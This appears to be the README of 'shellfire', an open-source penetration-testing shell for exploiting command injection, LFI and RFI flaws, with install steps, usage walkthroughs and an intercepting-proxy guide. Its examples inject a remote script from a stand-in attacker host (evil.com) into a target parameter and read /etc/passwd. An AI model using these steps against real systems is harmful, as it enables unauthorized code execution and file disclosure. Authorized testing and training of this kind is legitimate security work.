# shellfire

_shellfire_ is an exploitation shell which focuses on exploiting command injection vulnerabilities. This can be useful when exploiting LFI, RFI, SSTI, etc.

I originally started developing this script while working on my OSCP labs. As the capabilities grew, I thought maybe other people could find this as 
useful as I have, so I decided to open source my tool.

## Features  

- [X] Persistent named configuration for multiple targets (and sharing!)  
- [X] Plugin system  
- [X] PHP payload  
- [X] ASP payload  
- [X] Intercepting HTTP(S) proxy to capture requests and seed exploit config  


## Installation  

There are a few ways to install this tool. Shellfire is available via PyPI, so you can use pip.

```
$ pip install shellfire
```

From Kali Linux, you can even use apt.

```
$ sudo apt install shellfire
```

If you'd like to build from source, you can use the standard Python setuptools to install this package.

```
$ git clone https://github.com/unix-ninja/shellfire.git
$ cd shellfire
$ python setup.py install
```

## A few useful hints

After installing, you can just call 'shellfire' from your terminal.

```
$ shellfire
[*] ShellFire v0.11
[*] Type 'help' to see available commands
(config)>
```

You can type `help` at any time inside config mode for a list of available commands, or append 
the command you want to know more information about to help for specific 
details. For example `help http`.

Let's explore how to attack a basic RFI vulnerability!

To start exploitation, you need to specify at least the URL parameter of your target. 
Something like the following should work:

```
(config)> url http://example.com/?path=http://evil.com/script.php
```

Running any command now would cause your RFI to get executed on the remote target.

Let's say you want to arbitrarily control the payloads going to the path paramter. This time, we will use `{}` to specify our injection point.

```
(config)> url http://example.com/?path={}
```

Before we can send our payloads, we must enter shell mode.

```
(config)> shell
```

Now, you can just type the payload you want to send and hit enter.

```
(shell)> /etc/passwd
```

You can always type "exit" to return from shell mode, back to config mode.

```
(shell)> exit
```

At this point, you should have enough to exploit easy vulnerabilities. Payloads you enter on the shell will be appropriately injected and sent over to your target.

More complex vulnerabilities may require specifying additional options. 
For example, let's assume you needed to send a cookie with a session ID in 
order to exploit your target. You may want to add something like this:

```
(config)> cookies { "session_id" : "123456789" }
```

We can specify injection points in cookies too.

```
(config)> cookies { "session_id" : "123456789", "vuln_param": "{}" }
```

## Capturing requests with the proxy

Rather than transcribing URLs, cookies, and POST bodies by hand, you can let
shellfire observe a real browser session and seed your exploit config from a
captured request.

Start the intercepting proxy (default port 8080):

```
(config)> proxy start 8080
[*] Proxy listening on 8080
[*] Point your browser here and trust the CA: ~/.config/shellfire/ca/shellfire-ca.crt
```

Point your browser's HTTP/HTTPS proxy at `127.0.0.1:8080`. To capture HTTPS
traffic, import the CA certificate shown above into your browser or OS trust
store (you only need to do this once). You can reprint the path anytime with
`proxy ca`.

Now browse to your target and exercise the vulnerable request. Everything the
browser sends is captured for the session:

```
(config)> proxy list
  [0] GET https://example.com/view?file=welcome.php
  [1] POST https://example.com/login
```

Inspect a captured request in full with `proxy show <index>`, then seed your
exploit config from it:

```
(config)> proxy use 0
[*] Seeded exploit config from captured request:
[*]   URL:     https://example.com/view?file=welcome.php
[*]   Method:  GET
[*]   Headers: {"User-Agent": "...", "Referer": "..."}
[*]   Cookies: {"session_id": "123456789"}
[*] Tip: add '{}' to mark your injection point (e.g. `url`, `post`).
```

`proxy use` populates the URL, method, headers, cookies, and any POST/form body
from the captured request. From there, add a `{}` injection marker to whichever
parameter is vulnerable (see the RFI walkthrough above) and drop into `shell`
mode to start exploiting. Use `proxy clear` to discard captures and
`proxy stop` when you're done.

Additional options, and information on how to use them, can be discovered by 
using the `help` option in config mode.

Thanks to Offensive-Security for inspiring the creation of this utility.

Please use this tool for good.

Happy hacking!


## Testing  

Testing is currently being done against the [dvwa docker image](https://hub.docker.com/r/vulnerables/web-dvwa/).
